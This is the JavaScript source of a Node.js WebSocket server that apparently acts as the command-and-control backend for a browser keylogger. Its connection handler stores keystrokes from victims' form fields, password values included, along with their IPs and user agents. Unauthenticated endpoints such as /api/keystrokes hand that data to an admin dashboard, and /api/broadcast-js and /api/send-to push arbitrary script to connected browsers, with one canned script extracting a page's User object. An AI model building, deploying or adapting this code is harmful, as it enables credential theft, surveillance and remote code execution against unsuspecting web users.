const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8080;
const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
let clientIdCounter = 0;
const commandHistory = [];
const userDataStore = {};
const messageLog = [];
const keystrokeStore = {}; // clientId -> { fieldId -> { value, meta, ts } }

wss.on('connection', (ws, req) => {
    // Admin connection
    if (req.url === '/?admin=true') {
        adminClients.add(ws);

        ws.on('close', () => adminClients.delete(ws));
        ws.on('error', () => adminClients.delete(ws));

        const clientList = [];
        for (const [w, info] of clients) {
            if (!info.isAdmin) {
                clientList.push({
                    ...info,
                    userData: userDataStore[info.id] || null,
                    keystrokes: keystrokeStore[info.id] || {}
                });
            }
        }
        ws.send(JSON.stringify({
            type: 'init',
            clients: clientList,
            commandHistory: commandHistory.slice(-50),
            messageLog: messageLog.slice(-100)
        }));
        return;
    }

    // Regular client connection
    const clientId = ++clientIdCounter;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';

    const clientInfo = {
        id: clientId,
        ip,
        userAgent,
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        messageCount: 0,
        origin: req.headers['origin'] || 'Unknown'
    };

    clients.set(ws, clientInfo);
    keystrokeStore[clientId] = {};
    console.log(`Client #${clientId} connected from ${ip}`);

    broadcastToAdmins({
        type: 'client_connected',
        client: clientInfo,
        totalClients: clients.size
    });

    ws.on('message', (message) => {
        const msgStr = message.toString();
        clientInfo.lastSeen = new Date().toISOString();
        clientInfo.messageCount++;

        if (msgStr === 'ping') return;

        let parsed = null;
        try { parsed = JSON.parse(msgStr); } catch (e) {}

        // Handle keystroke messages separately
        if (parsed && parsed.type === 'keystroke') {
            const fieldKey = parsed.fieldId + '_' + parsed.fieldType;
            keystrokeStore[clientId][fieldKey] = {
                fieldId: parsed.fieldId,
                fieldType: parsed.fieldType,
                placeholder: parsed.placeholder,
                label: parsed.label,
                isPassword: parsed.isPassword,
                value: parsed.value,
                length: parsed.length,
                url: parsed.url,
                title: parsed.title,
                updatedAt: new Date().toISOString()
            };

            broadcastToAdmins({
                type: 'keystroke',
                clientId,
                fieldKey,
                field: keystrokeStore[clientId][fieldKey]
            });
            return; // Don't log keystrokes as regular messages
        }

        const logEntry = {
            clientId,
            timestamp: new Date().toISOString(),
            raw: msgStr.substring(0, 5000),
            parsed
        };

        messageLog.push(logEntry);
        if (messageLog.length > 500) messageLog.shift();

        if (parsed) {
            userDataStore[clientId] = {
                data: parsed,
                receivedAt: new Date().toISOString()
            };
        }

        broadcastToAdmins({
            type: 'client_message',
            clientId,
            data: parsed || msgStr,
            timestamp: logEntry.timestamp
        });

        console.log(`Client #${clientId}: ${msgStr.substring(0, 200)}`);
    });

    ws.on('close', () => {
        console.log(`Client #${clientId} disconnected`);
        broadcastToAdmins({
            type: 'client_disconnected',
            clientId,
            totalClients: clients.size - 1
        });
        clients.delete(ws);
    });

    ws.on('error', (err) => {
        console.error(`Client #${clientId} error:`, err.message);
        clients.delete(ws);
    });
});

const adminClients = new Set();

function broadcastToAdmins(data) {
    const msg = JSON.stringify(data);
    for (const aws of adminClients) {
        if (aws.readyState === WebSocket.OPEN) aws.send(msg);
    }
}

app.get('/api/broadcast-js', (req, res) => {
    const { script } = req.query;
    if (typeof script !== 'string') return res.status(400).json({ error: "Missing ?script=" });

    let sentCount = 0;
    for (const [ws, info] of clients) {
        if (ws.readyState === WebSocket.OPEN && !info.isAdmin) {
            ws.send(script);
            sentCount++;
        }
    }

    commandHistory.push({ script, sentTo: sentCount, timestamp: new Date().toISOString() });
    if (commandHistory.length > 200) commandHistory.shift();

    broadcastToAdmins({ type: 'command_sent', script, sentTo: sentCount, timestamp: new Date().toISOString() });
    return res.json({ status: 'ok', sentTo: sentCount });
});

app.get('/api/send-to', (req, res) => {
    const { id, script } = req.query;
    if (!id || !script) return res.status(400).json({ error: "Missing ?id= or ?script=" });

    const targetId = parseInt(id);
    let sent = false;

    for (const [ws, info] of clients) {
        if (info.id === targetId && ws.readyState === WebSocket.OPEN) {
            ws.send(script);
            sent = true;
            break;
        }
    }

    return res.json({ status: sent ? 'ok' : 'client_not_found', clientId: targetId });
});

app.get('/api/clients', (req, res) => {
    const list = [];
    for (const [ws, info] of clients) {
        if (!info.isAdmin) {
            list.push({
                ...info,
                readyState: ws.readyState,
                userData: userDataStore[info.id] || null,
                keystrokes: keystrokeStore[info.id] || {}
            });
        }
    }
    return res.json(list);
});

app.get('/api/userdata', (req, res) => res.json(userDataStore));
app.get('/api/history', (req, res) => res.json(commandHistory));
app.get('/api/messages', (req, res) => {
    const limit = parseInt(req.query.limit) || 100;
    return res.json(messageLog.slice(-limit));
});
app.get('/api/keystrokes', (req, res) => res.json(keystrokeStore));

app.get('/api/request-user-info', (req, res) => {
    const script = 'window.postMessage({ action: "sendToWS", message: JSON.stringify(typeof User !== "undefined" ? User : {error:"User not defined"}) }, "*");';
    let sentCount = 0;
    for (const [ws, info] of clients) {
        if (ws.readyState === WebSocket.OPEN && !info.isAdmin) {
            ws.send(script);
            sentCount++;
        }
    }
    return res.json({ status: 'ok', sentTo: sentCount });
});

app.get('/screenshot.png', (req, res) => {
    if (fs.existsSync('screenshot.png')) res.sendFile(path.join(__dirname, 'screenshot.png'));
    else res.status(404).send('No screenshot found');
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
